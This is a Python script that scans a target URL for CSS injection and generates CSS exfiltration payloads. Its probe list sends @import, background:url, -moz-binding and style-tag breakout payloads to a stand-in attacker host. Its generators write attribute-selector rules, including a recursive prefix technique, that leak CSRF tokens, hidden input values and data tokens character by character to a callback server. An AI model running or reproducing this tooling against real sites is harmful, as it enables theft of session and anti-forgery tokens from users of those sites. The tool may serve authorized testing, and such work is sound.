#!/usr/bin/env python3
"""
css_injection_scanner.py — CSS injection and CSS exfiltration scanner.

Detects CSS injection points, generates CSS attribute selector exfiltration
payloads for CSRF tokens and other sensitive values, and tests for reflected
CSS injection in style parameters.

Usage:
  python3 tools/css_injection_scanner.py --url https://app.example.com/profile
  python3 tools/css_injection_scanner.py --url https://app.example.com/profile --callback https://attacker.example.com
  python3 tools/css_injection_scanner.py --url https://app.example.com/profile --dry-run
  python3 tools/css_injection_scanner.py --url https://app.example.com/profile --json
"""

import argparse
import json
import re
import time
import urllib.request
import urllib.error
import urllib.parse

# ─── Color codes ──────────────────────────────────────────────────────────────
RED    = "\033[91m"
YELLOW = "\033[93m"
GREEN  = "\033[92m"
CYAN   = "\033[96m"
BLUE   = "\033[94m"
BOLD   = "\033[1m"
DIM    = "\033[2m"
RESET  = "\033[0m"

FINDINGS = []

# Callback used as placeholder when --callback not provided
DEFAULT_CALLBACK = "https://attacker.example.com/collect"

# Characters to enumerate in CSS exfil (hex chars + common CSRF token chars)
CSRF_CHARS = "0123456789abcdefABCDEF-_"

# CSS injection test payloads
CSS_INJECTION_PROBES = [
    # Test for style context injection
    ("basic-color",          "color:red"),
    ("background-url",       "background:url(https://attacker.example.com/csstest)"),
    ("import",               "@import url(https://attacker.example.com/csstest)"),
    ("expression-old-ie",    "color:expression(alert(1))"),
    ("behavior-old-ie",      "behavior:url(https://attacker.example.com/test.htc)"),
    ("moz-binding",          "-moz-binding:url(https://attacker.example.com/test.xml#xss)"),
    ("font-face",            "@font-face{font-family:x;src:url(https://attacker.example.com/font)}"),
    ("filter-ie",            "filter:progid:DXImageTransform.Microsoft.AlphaImageLoader(src=https://attacker.example.com/csstest)"),
    ("unicode-escape",       "c\\6f lor:red"),
    ("null-byte-break",      "color:re\x00d"),
    ("comment-break",        "color:/**/red"),
    ("closing-brace",        "}body{background:url(https://attacker.example.com/csstest)}"),
    ("style-tag-break",      "</style><style>body{background:url(https://attacker.example.com/csstest)}"),
]

# Parameters that often accept CSS or style values
STYLE_PARAMS = [
    "style", "css", "color", "theme", "background", "font",
    "skin", "template", "format", "layout", "design",
]

# Sensitive HTML attributes to exfiltrate via CSS selectors
SENSITIVE_ATTRS = [
    ("csrf-token",     'input[name="csrf_token"]',          "value"),
    ("csrf-field",     'input[name="_token"]',              "value"),
    ("auth-token",     'input[name="authenticity_token"]',  "value"),
    ("hidden-inputs",  'input[type="hidden"]',              "value"),
    ("data-user-id",   '[data-user-id]',                    "data-user-id"),
    ("data-token",     '[data-token]',                      "data-token"),
    ("href-links",     'a[href^="/admin"]',                  "href"),
    ("form-action",    'form[action]',                      "action"),
    ("meta-content",   'meta[name="csrf-token"]',           "content"),
]


# ─── HTTP Helpers ─────────────────────────────────────────────────────────────

def http_get(url: str, timeout: int = 10) -> tuple[int, dict, str]:
    req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0", "Accept": "*/*"})
    try:
        with urllib.request.urlopen(req, timeout=timeout) as r:
            body = r.read().decode(errors="replace")
            headers = {k.lower(): v for k, v in r.headers.items()}
            return r.status, headers, body
    except urllib.error.HTTPError as e:
        body = e.read().decode(errors="replace")
        headers = {k.lower(): v for k, v in e.headers.items()}
        return e.code, headers, body
    except Exception as e:
        return 0, {}, str(e)


def http_get_with_param(url: str, param: str, value: str,
                         timeout: int = 10) -> tuple[int, dict, str]:
    parsed = urllib.parse.urlparse(url)
    qs = urllib.parse.urlencode({param: value})
    test_url = urllib.parse.urlunparse(parsed._replace(query=qs))
    return http_get(test_url, timeout)


def record(test: str, result: str, detail: str, severity: str = "MEDIUM"):
    FINDINGS.append({"test": test, "result": result, "detail": detail, "severity": severity})
    color = RED if result == "VULNERABLE" else (YELLOW if result == "INTERESTING" else GREEN)
    print(f"  {color}[{result}]{RESET} {test}")
    if detail:
        print(f"    {DIM}{detail}{RESET}")


# ─── CSS Exfil Payload Generators ─────────────────────────────────────────────

def generate_css_exfil_payload(selector: str, attr: str, callback: str,
                                 chars: str = CSRF_CHARS) -> str:
    """
    Generate a CSS attribute selector exfiltration payload.
    For each possible first character of the attribute value, fire a background-image request.

    Example output:
      input[value^="a"] { background: url(https://cb.example.com?c=a); }
      input[value^="b"] { background: url(https://cb.example.com?c=b); }
      ...
    """
    lines = [f"/* CSS Exfil — selector: {selector}[{attr}] */"]
    for char in chars:
        encoded_char = urllib.parse.quote(char)
        lines.append(
            f'{selector}[{attr}^="{char}"] '
            f'{{ background: url({callback}?c={encoded_char}); }}'
        )
    return "\n".join(lines)


def generate_blind_css_import(callback: str) -> str:
    """Generate CSS @import-based exfil payload for injected style context."""
    return f"@import url({callback}/css-import-probe);"


def generate_recursive_exfil(selector: str, attr: str, callback: str,
                               prefix: str = "", depth: int = 8) -> str:
    """
    Generate multi-character CSS exfil using known-prefix technique.
    Each response tells attacker the next character, allowing full exfiltration.
    """
    lines = [f"/* Recursive CSS exfil for {selector}[{attr}] — prefix={prefix!r} */"]
    lines.append(f"/* Server-side: receive callback, then serve updated CSS for next char */")
    lines.append(f"/* Current prefix length: {len(prefix)} / target depth: {depth} */")
    lines.append("")
    for char in CSRF_CHARS:
        val = prefix + char
        lines.append(
            f'{selector}[{attr}^="{val}"] '
            f'{{ background-image: url({callback}?prefix={urllib.parse.quote(val)}); }}'
        )
    return "\n".join(lines)


# ─── Test Cases ───────────────────────────────────────────────────────────────

def detect_css_injection_surface(url: str, rate: float, dry_run: bool):
    print(f"\n{BOLD}[1] CSS Injection Surface Detection{RESET}")
    print(f"  {DIM}Testing {len(STYLE_PARAMS)} style params × {len(CSS_INJECTION_PROBES)} payloads{RESET}")

    # First, get baseline response
    if not dry_run:
        time.sleep(1.0 / rate)
        baseline_status, _, baseline_body = http_get(url)
        print(f"  {DIM}Baseline: HTTP {baseline_status}, {len(baseline_body)} bytes{RESET}")
    else:
        baseline_body = ""

    probe_payload = CSS_INJECTION_PROBES[1][1]  # background:url(attacker.example.com/csstest)

    for param in STYLE_PARAMS:
        for name, payload in CSS_INJECTION_PROBES[:4]:  # Test first 4 probes per param
            if dry_run:
                print(f"  {CYAN}[DRY-RUN]{RESET} ?{param}={payload[:50]}...")
                continue
            time.sleep(1.0 / rate)
            status, headers, body = http_get_with_param(url, param, payload)

            # Check if payload is reflected
            if payload in body or payload.replace(":", "%3A") in body:
                record(f"css-reflect-{param}-{name}", "VULNERABLE",
                       f"Payload reflected in body: ?{param}={payload[:60]}")
            elif re.search(r'(?<![.\w])attacker\.example\.com(?![.\w])', body):
                record(f"css-reflect-{param}-{name}", "INTERESTING",
                       f"Attacker domain in response: ?{param}=...")
            elif status in (200, 201) and len(body) != len(baseline_body):
                record(f"css-reflect-{param}-{name}", "INTERESTING",
                       f"Body size changed: {len(baseline_body)}→{len(body)} bytes")


def scan_for_injectable_html(url: str, rate: float, dry_run: bool):
    print(f"\n{BOLD}[2] HTML Source Analysis — Injectable Style Points{RESET}")
    if dry_run:
        print(f"  {CYAN}[DRY-RUN]{RESET} Would fetch {url} and scan for:")
        print(f"    {DIM}- User-controlled style attributes{RESET}")
        print(f"    {DIM}- Inline CSS with reflected values{RESET}")
        print(f"    {DIM}- <style> blocks with user input{RESET}")
        return

    time.sleep(1.0 / rate)
    status, headers, body = http_get(url)
    if status == 0:
        print(f"  {RED}[ERROR]{RESET} Could not fetch {url}")
        return

    # Check for style attributes
    style_attrs = re.findall(r'style=["\']([^"\']{3,})["\']', body)
    if style_attrs:
        print(f"  {YELLOW}[INFO]{RESET} Found {len(style_attrs)} style attributes in HTML")
        for attr in style_attrs[:5]:
            print(f"    {DIM}style=\"{attr[:80]}\"{RESET}")
        FINDINGS.append({"test": "style-attrs-found", "result": "INTERESTING",
                          "detail": f"{len(style_attrs)} style attributes found",
                          "severity": "LOW"})

    # Check for <style> blocks
    style_blocks = re.findall(r'<style[^>]*>(.*?)</style>', body, re.DOTALL | re.IGNORECASE)
    if style_blocks:
        print(f"  {YELLOW}[INFO]{RESET} Found {len(style_blocks)} <style> blocks")

    # Look for URL query params reflected in style context
    parsed = urllib.parse.urlparse(url)
    qs = urllib.parse.parse_qs(parsed.query)
    for k, vals in qs.items():
        for v in vals:
            # Check if param value appears inside a style context
            style_ctx_pattern = re.compile(
                r'style=["\'][^"\']*' + re.escape(v) + r'[^"\']*["\']', re.IGNORECASE
            )
            if style_ctx_pattern.search(body):
                record(f"css-param-in-style-{k}", "VULNERABLE",
                       f"Query param {k}={v!r} reflected inside style attribute")

    # Check for CSRF token / hidden inputs (exfil targets)
    csrf_inputs = re.findall(
        r'<input[^>]+(?:name=["\'](?:csrf|_token|authenticity_token)[^"\']*["\'])[^>]*>',
        body, re.IGNORECASE
    )
    if csrf_inputs:
        print(f"  {YELLOW}[INFO]{RESET} Found {len(csrf_inputs)} CSRF token input(s) — exfil targets")
        for inp in csrf_inputs[:3]:
            print(f"    {DIM}{inp[:100]}{RESET}")
        FINDINGS.append({"test": "csrf-inputs-found", "result": "INTERESTING",
                          "detail": f"{len(csrf_inputs)} CSRF inputs (exfil targets if CSS injection found)",
                          "severity": "INFO"})


def generate_exfil_payloads(url: str, callback: str):
    print(f"\n{BOLD}[3] CSS Exfiltration Payloads{RESET}")
    cb = callback or DEFAULT_CALLBACK
    print(f"  {DIM}Callback: {cb}{RESET}")
    print()

    for name, selector, attr in SENSITIVE_ATTRS:
        payload = generate_css_exfil_payload(selector, attr, cb, chars=CSRF_CHARS)
        print(f"  {CYAN}[{name}]{RESET} {selector}[{attr}]")
        # Show first 3 rules
        lines = payload.split("\n")
        for line in lines[:4]:
            print(f"    {DIM}{line}{RESET}")
        print(f"    {DIM}... ({len(CSRF_CHARS)} rules total){RESET}")
        print()

    # Also show @import-based payload
    print(f"  {CYAN}[@import probe]{RESET}")
    print(f"    {DIM}{generate_blind_css_import(cb)}{RESET}")

    # Show recursive exfil example
    print(f"\n  {CYAN}[Recursive exfil — after first char known]{RESET}")
    rec = generate_recursive_exfil('input[name="csrf_token"]', "value", cb, prefix="a", depth=8)
    for line in rec.split("\n")[:6]:
        print(f"    {DIM}{line}{RESET}")
    print(f"    {DIM}...{RESET}")

    FINDINGS.append({
        "test": "css-exfil-payloads",
        "result": "INFO",
        "detail": f"Generated exfil payloads for {len(SENSITIVE_ATTRS)} selectors. "
                  f"Use if CSS injection point is confirmed.",
        "severity": "INFO",
        "callback": cb,
    })


def test_style_injection_params(url: str, callback: str, rate: float, dry_run: bool):
    print(f"\n{BOLD}[4] Reflected CSS Injection Test{RESET}")
    cb = callback or DEFAULT_CALLBACK
    test_payload = f"}}body{{background:url({cb}/css-inject-probe)}}{{"

    for param in STYLE_PARAMS[:5]:
        if dry_run:
            print(f"  {CYAN}[DRY-RUN]{RESET} ?{param}={test_payload[:60]}...")
            continue
        time.sleep(1.0 / rate)
        status, _, body = http_get_with_param(url, param, test_payload)
        if "css-inject-probe" in body or test_payload[:20] in body:
            record(f"reflected-css-{param}", "VULNERABLE",
                   f"CSS injection payload reflected: ?{param}=...{test_payload[:40]}")
        else:
            record(f"reflected-css-{param}", "BLOCKED", f"HTTP {status}")


# ─── Main ─────────────────────────────────────────────────────────────────────

def main():
    parser = argparse.ArgumentParser(description="CSS injection and CSS exfil scanner")
    parser.add_argument("--url",      required=True, help="Target URL to scan")
    parser.add_argument("--callback", default="",
                        help="Callback URL for CSS exfil payloads (e.g. https://your.interactsh.com)")
    parser.add_argument("--rate",     type=float, default=1.0, metavar="REQ/S",
                        help="Request rate limit in req/sec (default: 1.0)")
    parser.add_argument("--dry-run",  action="store_true",
                        help="Show what would be tested without sending requests")
    parser.add_argument("--json",     action="store_true", dest="json_output",
                        help="Output results as JSON")
    args = parser.parse_args()

    print(f"\n{BOLD}{BLUE}╔══════════════════════════════════════╗")
    print(f"║   CSS Injection Scanner              ║")
    print(f"╚══════════════════════════════════════╝{RESET}")
    print(f"  Target   : {CYAN}{args.url}{RESET}")
    print(f"  Callback : {args.callback or DEFAULT_CALLBACK}")
    print(f"  Rate     : {args.rate} req/sec")
    if args.dry_run:
        print(f"  Mode     : {YELLOW}DRY-RUN (no requests sent){RESET}")

    detect_css_injection_surface(args.url, args.rate, args.dry_run)
    scan_for_injectable_html(args.url, args.rate, args.dry_run)
    generate_exfil_payloads(args.url, args.callback)
    test_style_injection_params(args.url, args.callback, args.rate, args.dry_run)

    vulns = [f for f in FINDINGS if f["result"] == "VULNERABLE"]
    interesting = [f for f in FINDINGS if f["result"] == "INTERESTING"]
    print(f"\n{BOLD}{'─'*50}{RESET}")
    print(f"  Tests run   : {len(FINDINGS)}")
    if vulns:
        print(f"  {RED}Vulnerable  : {len(vulns)}{RESET}")
    else:
        print(f"  {GREEN}Vulnerable  : 0{RESET}")
    if interesting:
        print(f"  {YELLOW}Interesting : {len(interesting)}{RESET}")

    if args.json_output:
        # Include full exfil payloads in JSON output
        cb = args.callback or DEFAULT_CALLBACK
        full_payloads = {}
        for name, selector, attr in SENSITIVE_ATTRS:
            full_payloads[name] = generate_css_exfil_payload(selector, attr, cb)
        print(json.dumps({
            "url": args.url,
            "findings": FINDINGS,
            "exfil_payloads": full_payloads,
        }, indent=2))


if __name__ == "__main__":
    main()
